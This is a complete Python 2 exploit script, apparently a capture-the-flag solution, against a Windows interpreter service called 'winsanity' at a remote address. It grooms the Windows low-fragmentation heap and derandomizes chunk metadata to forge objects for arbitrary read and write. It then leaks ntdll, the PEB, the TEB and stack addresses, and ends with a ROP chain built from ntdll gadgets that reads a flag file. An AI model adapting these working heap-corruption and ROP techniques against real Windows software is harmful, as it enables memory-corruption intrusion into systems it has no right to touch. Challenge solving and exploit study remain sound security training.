### This exploit assumes Windows environment with:
###   python2 with modules:
###     customized pwintools(https://github.com/leesh3288/pwintools)
###     bugfixed pdbparse(https://github.com/leesh3288/pdbparse)
###     pysha3
from pwintools import *
from pdbparse.symlookup import Lookup
from ast import literal_eval
from subprocess import check_output
from sha3 import sha3_256


def inject(pe, sym, name):
    if name not in pe.symbols:
        pe.symbols[name] = next(
            sym.locs[base, limit][sym.names[base, limit].index(name)]
            for base, limit in sym.addrs
            if name in sym.names[base, limit]
        )


DEBUG = False
binary = PE(r'..\dist\winsanity.exe')
binary_sym = Lookup([(r'..\dist\winsanity.pdb', 0)])
inject(binary, binary_sym, 'main')

if DEBUG:
    ntdll = PE(r'C:\Windows\System32\ntdll.dll')
    kernel32 = PE(r'C:\Windows\System32\kernel32.dll')
else:
    ntdll = PE(r'..\dist\libs\ntdll.dll')
    kernel32 = PE(r'..\dist\libs\kernel32.dll')

# downloadable from Microsoft Symbol Server given ntdll.dll
ntdll_sym = Lookup([(r'.\ntdll.pdb', 0)])
inject(ntdll, ntdll_sym, 'RtlpStaticDebugInfo')
inject(ntdll, ntdll_sym, 'TlsExpansionBitMap')


while True:
    if DEBUG:
        p = Process(r'..\dist\winsanity.exe')
        #p.timeout = 10000000
        #p.spawn_debugger(x96dbg = True, sleep = 3)
    else:
        p = Remote('183.107.102.15', 17324)
        p.timeout = 5000


    log.info('Connection established.')


    def interp(s):
        p.sendline(s)
        return p.recvuntil('>>> ', drop=True).strip()

    def recv_int_arr(var):
        res = interp('print ' + var)
        res = res.replace('[', ' ').replace(']', ' ' ).replace(',', ' ').split()
        res = list(int(e) & 0xffffffff for e in res)
        return res

    def d2q(d2):
        return (d2[0] & 0xffffffff) | ((d2[1] & 0xffffffff) << 32)

    def q2d(q):
        return (q & 0xffffffff, (q >> 32) & 0xffffffff)

    def SSCEncode(zero_ssc, base, stride, offset, idx, fake_offset):
        offset_zero = stride * 0 + offset
        addr_zero = base + offset_zero
        offset_idx = stride * idx + offset
        addr_idx = base + offset_idx
        return zero_ssc ^ (addr_idx >> 4) ^ (addr_zero >> 4) ^ (fake_offset << 12) ^ (offset_zero << 12)

    # derandomizer assumes that only lower 2 bytes change for simplicity
    def derandomizer(base, stride, offset, leaks):
        assert(leaks.count(0) == 1)  # last chunk assertion
        last_chunk = leaks.index(0)
        chunk_count = len(leaks)
        
        # pre-build pair XOR leaks
        pair_xor_map = {}
        for i in range(chunk_count):
            offset_i = stride * i + offset
            addr_i = base + offset_i
            for j in range(i + 1, chunk_count):
                offset_j = stride * j + offset
                addr_j = base + offset_j
                xor = (addr_i >> 4) ^ (addr_j >> 4) ^ (offset_i << 12) ^ (offset_j << 12)
                if xor in pair_xor_map:  # we can do better, but i'm lazy :)
                    pair_xor_map[xor] |= set((i, j))
                else:
                    pair_xor_map[xor] = set((i, j))
        
        idx = []
        for i in range(chunk_count):
            if i == last_chunk:
                idx.append(chunk_count)
                continue
            intersect_idx = set(range(1, chunk_count))
            for j in range(chunk_count):
                if j == i or j == last_chunk:
                    continue
                intersect_idx &= set(pair_xor_map[leaks[i] ^ leaks[j]])
            assert(len(intersect_idx) == 1)  # only one possible index
            idx.append(intersect_idx.pop())

        ref = int(last_chunk == 0)  # choose one non-zero ssc
        offset_ref = stride * idx[ref] + offset
        zero_ssc = SSCEncode(leaks[ref], base, stride, offset, idx[ref], offset_ref)

        idx = [i - 1 for i in idx]
        assert(sorted(idx) == list(range(0, chunk_count)))

        return idx, zero_ssc


    # PoW solving
    pt = p.recvuntil('>>> ')
    pt = pt[pt.find('"')+1:]
    pow_nonce = pt[:pt.find('"')]
    pow_difficulty = int(pt[pt.find('has ')+4:].split()[0])

    log.info('Solving PoW with difficulty {}, nonce "{}"...'.format(pow_difficulty, pow_nonce))
    pow_solved = check_output([r'.\PoWSolver.exe', str(pow_difficulty), pow_nonce]).strip()
    pow_hash = sha3_256(pow_solved + pow_nonce).hexdigest()
    log.success('PoW solved: sha3_256({} || {}) == {}'.format(pow_solved, pow_nonce, pow_hash))

    interp(pow_solved)


    # 0x48 LFH ready, no UserBlocks yet
    # 0x168 LFH UserBlocks #1 at 4AE0, count 0xa (remaining 0x5)

    log.info('Shaping heap...')

    # saturate 0x168 UserBlocks #1
    # this is to easily locate our fake free chunk later on
    for i in range(0x5):
        interp('let fill_168_{} "{}"'.format(i, 'a'*0x40))

    # allocate and saturate 0x48 UserBlocks #1 at 5EF0 (count 0x18)
    # prep several of them to use as integers to go into optimized array
    for i in range(0xd):
        interp('let int{} {}'.format(i, i))
    interp('let int255 0xff')
    for i in range(0x18 - 0xd - 1):
        interp('let fill_48_{} 0'.format(i))

    # allocate and saturate 0x48 UserBlocks #2 at 6700 (count 0x32)
    # these are target chunks to derandomize, so create optimized integer array
    for i in range(0x32):
        interp('letarr var{} 0xd {}'.format(i, ' '.join('int{}'.format(j) for j in range(0xd))))

    log.info('Leaking SubSegmentCode of 0x48-sized target LFH chunks...')

    # copy 0x32 chunks of optimized integer array, triggering OOB RW
    # this goes into 0x48 UserBlocks #3 (count 0x32)
    for i in range(0x32):
        interp('copy cpy{} var{}'.format(i, i))

    # leak next chunk SubSegmentCode of each var chunks
    var_next_ssc = []
    for i in range(0x32):
        var_next_ssc.append(recv_int_arr('cpy{}'.format(i))[-1])
    log.info('SubSegmentCode leaks: [' + ', '.join('{:08X}'.format(ssc) for ssc in var_next_ssc) + ']')

    log.info('Derandomizing target LFH chunks...')
    var_idx, zero_ssc = derandomizer(0x6700, 0x50, 0x40, var_next_ssc)
    chunk_ssc = [0] * 0x32
    log.success('Derandomization complete: ' + str(var_idx))

    log.info('Remapping variable names based on derandomization info...')
    for i in range(0x32):
        interp('let chunk{} var{}'.format(var_idx[i], i))
    for i in range(0x32):
        interp('del var{}'.format(i))
    log.success('Remapping success. chunk0 ~ chunk{} is now ordered.'.format(0x32 - 1))
    log.info('Computed SubSegmentCode of chunk0: {:08X}'.format(zero_ssc))

    # overwriting chunk25 SubSegmentCode to fake computed UserBlocks as 0x168 LFH UserBlocks #1
    # this fakes it as 25th chunk of 0x168 LFH UserBlocks #1 at free
    fake_offset = 0x6700 + 0x50 * 25 + 0x40 - 0x4AE0
    fake_ssc = SSCEncode(zero_ssc, 0x6700, 0x50, 0x40, 25, fake_offset)
    log.info('chunk25 offset from 0x168 LFH UserBlocks #1: {:X}'.format(fake_offset))
    log.info('Writing fake SubSegmentCode {:08X} to chunk25...'.format(fake_ssc))

    # reallocate chunk24 as OOB-able optimized integer array
    interp('del chunk24')
    interp('copy chunk24 chunk0')
    interp('setarr chunk24 0xd {}'.format(fake_ssc))

    log.info('Freeing chunk25 into 0x168 LFH UserBlocks #1...')
    interp('del chunk25')
    # 0x48 LFH UserBlocks #2 will see chunk25 as still allocated

    log.info('Allocating fake free chunk...')
    # try overwriting chunk26 as a fake Object as below
    payload  = ['int0'] * (0x3c // 4)  # chunk25 area & chunk26 header
    payload += ['int255', 'int0']      # refcnt 0xff
    payload += ['int2', 'int0']        # type Array<?> (unoptimized array)
    payload += ['int1', 'int0']        # length 1, 4 padding byte
    payload += ['int0', 'int0']        # element NULL
    interp('letarr fake {} {}'.format(len(payload), ' '.join(payload)))
    assert(interp('type chunk26') == 'Array<?>')
    log.success('Allocated fake free chunk, chunk26 overwritten.')

    log.info('Leaking heap address...')
    interp('setarr chunk26 0 chunk0')
    chunk0_obj_addr = d2q(recv_int_arr('fake')[-2:])
    _HEAP = chunk0_obj_addr - (0x6700 + 0x40 + 0x10)
    log.success('_HEAP:      {:016X}'.format(_HEAP))
    assert(_HEAP & 0xffff == 0)
    RtlpLFHKey_lo = (zero_ssc ^ _HEAP ^ ((chunk0_obj_addr - 0x10) >> 4) ^ (0x40 << 12)) & 0xffffffff
    log.success('RtlpLFHKey: ????????{:08X}'.format(RtlpLFHKey_lo))

    inc_ctr = 0
    def inc(addr, ctr=1):
        global inc_ctr
        if ctr <= 0:
            return
        d2 = q2d(addr)
        interp('setarr fake 0x15 {}'.format(d2[0]))
        interp('setarr fake 0x16 {}'.format(d2[1]))
        interp('getarr inc{} chunk26 0'.format(inc_ctr))
        inc_ctr += 1
        if ctr > 1:
            elems = ' '.join('inc{}'.format(inc_ctr - 1) for _ in range(ctr - 1))
            # dummy string to prevent type checks on targeted fake object at list optimization check
            interp('letarr inc{} {} "" {}'.format(inc_ctr, ctr, elems))
            inc_ctr += 1

    def dec(addr):
        d2 = q2d(addr)
        interp('setarr fake 0x15 {}'.format(d2[0]))
        interp('setarr fake 0x16 {}'.format(d2[1]))
        interp('setarr chunk26 0 chunk0')

    def fetch_as(addr, var):
        d2 = q2d(addr)
        interp('setarr fake 0x15 {}'.format(d2[0]))
        interp('setarr fake 0x16 {}'.format(d2[1]))
        interp('getarr {} chunk26 0'.format(var))

    log.info('Leaking everything else that follows...')

    # leak ntdll from _HEAP->LockVariable->Lock.CriticalSection.DebugInfo pointing inside ntdll.RtlpStaticDebugInfo
    # somewhere at FrontEndHeapStatusBitmap where incrementing won't wreak havoc
    ntdll_leaker = _HEAP + 0x1ec
    inc(ntdll_leaker + 0x8)                 # set type as String (data starts at _HEAP + 0x200)
    inc(ntdll_leaker + 0x11)                # set length as 0x100
    fetch_as(ntdll_leaker, 'ntdll_leaker')  # fetch with refcnt increment
    check = u64(literal_eval(interp('print ntdll_leaker'))[0xc0:0xc8]) - ntdll.symbols['RtlpStaticDebugInfo']
    assert(check & 0xffff in range(0, 0x30*6, 0x30))
    ntdll.base = check & ~0xffff
    log.success('ntdll:      {:016X}'.format(ntdll.base))
    assert(ntdll.base & 0xffff == 0)

    # leak PEB from [&ntdll.TlsExpansionBitMap + 8] == &PEB.TlsExpansionBitmapBits
    PEB_leaker = ntdll.base + ntdll.symbols['TlsExpansionBitMap'] - 0x54
    inc(PEB_leaker + 0x8)               # set type as String (data starts at ntdll.base + ntdll.symbols['TlsExpansionBitMap'] - 0x40)
    inc(PEB_leaker + 0x11)              # set length as 0x100
    fetch_as(PEB_leaker, 'PEB_leaker')  # fetch with refcnt increment
    PEB = u64(literal_eval(interp('print PEB_leaker'))[0x48:0x50]) - 0x240
    log.success('PEB:        {:016X}'.format(PEB))
    assert(PEB & 0xfff == 0)

    # PEB near end of alignment, seems to act weird at 0xfe000 and 0xff000
    if (PEB & 0xff000) in [0xfe000, 0xff000]:
        log.warning("TEB = PEB + 0x1000 may not hold! Trying again...")
        p.close()
        continue

    # leak TEB contents (stack) from PEB + 0x1000
    TEB_leaker = PEB + 0x1000 - 0x14
    inc(TEB_leaker + 0x8)               # set type as String (data starts at TEB)
    inc(TEB_leaker + 0x11)              # set length as 0x100
    fetch_as(TEB_leaker, 'TEB_leaker')  # fetch with refcnt increment
    TEB_data = literal_eval(interp('print TEB_leaker'))
    StackBase  = u64(TEB_data[0x08:0x10])
    StackLimit = u64(TEB_data[0x10:0x18])
    log.success('StackBase:  {:016X}'.format(StackBase))
    log.success('StackLimit: {:016X}'.format(StackLimit))
    assert(StackBase & 0xffff == 0 and StackLimit & 0xfff == 0)

    # leak stack contents to leak everything & ROP
    log.info('Dumping stack data of size {:X}...'.format(StackBase - StackLimit))
    stack_leaker = StackLimit
    inc(stack_leaker + 0x8, 3)               # set type as Array<Integer>
    remain = StackBase - StackLimit - 0x14
    for i in range(4):                       # set size as the whole stack, excluding header 0x14
        unit = 0x4 << ((3 - i) * 8)
        incr = remain // unit
        remain -= incr * unit
        inc(stack_leaker + 0x10 + (3 - i), incr)
    fetch_as(stack_leaker, 'stack')
    try:  # we sometimes (but very rarely) fail here, dunno why...
        stack_data = ''.join(p32(dword) for dword in [0]*5 + recv_int_arr('stack'))
    except:
        log.warning('Failed to dump stack data! Trying again...')
        p.close()
        continue
    log.info('Stack data dumped.')

    log.info('Egghunt for ntdll.RtlUserThreadStart + 0x21')
    next_offset = stack_data.rfind(p64(ntdll.base + ntdll.symbols['RtlUserThreadStart'] + 0x21))
    assert(next_offset != -1)
    log.success('Found at {:016X}'.format(StackLimit + next_offset))

    log.info('Searching for kernel32 & binary base leak...')
    kernel32.base, next_offset = next(
        (u64(stack_data[offset:offset+8]) - (kernel32.symbols['BaseThreadInitThunk'] + 0x14), offset)
        for offset in range(next_offset - 8, 0, -8)
        if u64(stack_data[offset:offset+8]) & 0xffff == (kernel32.symbols['BaseThreadInitThunk'] + 0x14) & 0xffff
    )
    log.success('kernel32:   {:016X}'.format(kernel32.base))
    binary.base, RunInterpreter_retofs = next(
        (u64(stack_data[offset:offset+8]) - (binary.symbols['main'] + 0x4a), offset)
        for offset in range(next_offset - 8, 0, -8)
        if u64(stack_data[offset:offset+8]) & 0xffff == (binary.symbols['main'] + 0x4a) & 0xffff
    )
    log.success('winsanity:  {:016X}'.format(binary.base))
    payload_start = StackLimit + RunInterpreter_retofs
    log.success('RunInterpreter return address at {:016X}'.format(payload_start))


    """
    ROP gadgets
    ntdll:
    0x0000000180090c87 : add rsp, 0x40 ; pop rbp ; ret
    0x0000000180001029 : ret
    0x0000000180001b79 : xor eax, eax ; ret
    0x0000000180005f44 : pop rax ; ret
    0x000000018008db8f : pop rcx ; ret
    0x000000018008b547 : pop rdx ; pop r11 ; ret
    0x000000018008b544 : pop r9 ; pop r10 ; pop r11 ; ret
    0x000000018008b542 : pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
    0x000000018008b541 : pop rcx ; pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
    0x0000000180078773 : mov qword ptr [rcx], rax ; ret
    0x000000018008eb91 : xor r8d, r8d ; mov eax, r8d ; ret


    ROP chain
    copy scratch + 0x300 <- r"C:\CTF\flag.txt"
    r1 = OpenFile(scratch + 0x300, scratch, 0);
    ReadFile(r1, scratch + 0x100, 0x100, scratch + 0x200, 0);
    r2 = GetStdHandle(-11);
    WriteFile(r2, scratch + 0x100, 0x100, scratch + 0x200, 0);
    Sleep(0xffffffff);
    """

    skipper = ntdll.base + 0x90c87
    ret = ntdll.base + 0x1029
    pop_rax = ntdll.base + 0x5f44
    pop_rcx = ntdll.base + 0x8db8f
    pop_rdx_r11 = ntdll.base + 0x8b547
    pop_r9_r10_r11 = ntdll.base + 0x8b544
    pop_r8_r9_r10_r11 = ntdll.base + 0x8b542
    pop_rcx_r8_r9_r10_r11 = ntdll.base + 0x8b541
    mov_drcx_rax = ntdll.base + 0x78773
    xor_r8 = ntdll.base + 0x8eb91
    OpenFile = kernel32.base + kernel32.symbols['OpenFile']
    ReadFile = kernel32.base + kernel32.symbols['ReadFile']
    WriteFile = kernel32.base + kernel32.symbols['WriteFile']
    GetStdHandle = kernel32.base + kernel32.symbols['GetStdHandle']
    Sleep = kernel32.base + kernel32.symbols['Sleep']
    scratch = binary.base + 0x1f000

    payload  = [
        skipper,  # aligns at this position at function start (payload_start)
        None,  # skip over ctx pointer & ctx data, etc...
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        pop_rax,
        u64("lag.txt\0"),
        pop_rcx,
        scratch + 0x308,
        mov_drcx_rax,
        pop_rax,
        u64("C:\\CTF\\f"),
        pop_rcx,
        scratch + 0x300,  # r"C:\CTF\flag.txt"
        mov_drcx_rax,
        pop_rdx_r11,
        scratch + 0x000,
        None,
        xor_r8,
        ret,
        OpenFile,
        pop_rcx_r8_r9_r10_r11,
        None,  # shadow space
        None,
        None,
        None,
        None,
        pop_rcx,
        payload_start + 0x24 * 8,  # &r1
        mov_drcx_rax,
        pop_rcx,
        None,  # r1 (idx 0x24)
        pop_rdx_r11,
        scratch + 0x100,
        None,
        pop_r8_r9_r10_r11,
        0x100,
        scratch + 0x200,
        None,
        None,
        ReadFile,
        pop_rcx_r8_r9_r10_r11,
        None,
        None,
        None,
        None,
        0,
        ret,
        pop_rcx,
        (-11 & 0xffffffff),
        GetStdHandle,
        pop_rcx,
        payload_start + 0x3c * 8,  # &r2
        mov_drcx_rax,
        pop_rcx,
        None,  # r2 (idx 0x3c)
        pop_rdx_r11,
        scratch + 0x100,
        None,
        pop_r8_r9_r10_r11,
        0x100,
        scratch + 0x200,
        None,
        None,
        WriteFile,
        pop_rcx_r8_r9_r10_r11,
        None,
        None,
        None,
        None,
        0,
        ret,
        pop_rcx,
        0xffffffff,
        Sleep,
        None,  # ret of Sleep, not reached
        None,  # margin for shadow space
        None,
        None,
        None
    ]

    if payload_start + len(payload)*8 > StackBase:
        log.warning("Not enough remaining space for ROP gadgets! Trying again...")
        p.close()
        continue

    log.info('Writing ROP gadgets...')
    for i in range(len(payload)):
        if payload[i] is None:
            continue
        idx_lo, idx_hi = 2*i, 2*i+1
        lo, hi = q2d(payload[i])
        interp('setarr stack {} {}'.format((payload_start + idx_lo * 4 - (StackLimit + 0x14)) // 4, lo))
        interp('setarr stack {} {}'.format((payload_start + idx_hi * 4 - (StackLimit + 0x14)) // 4, hi))
    log.success('ROP gadgets prepared.')

    log.info('Triggering ROP through exit...')

    p.sendline('coffin')

    print(p.recvuntil('}'))

    p.close()

    break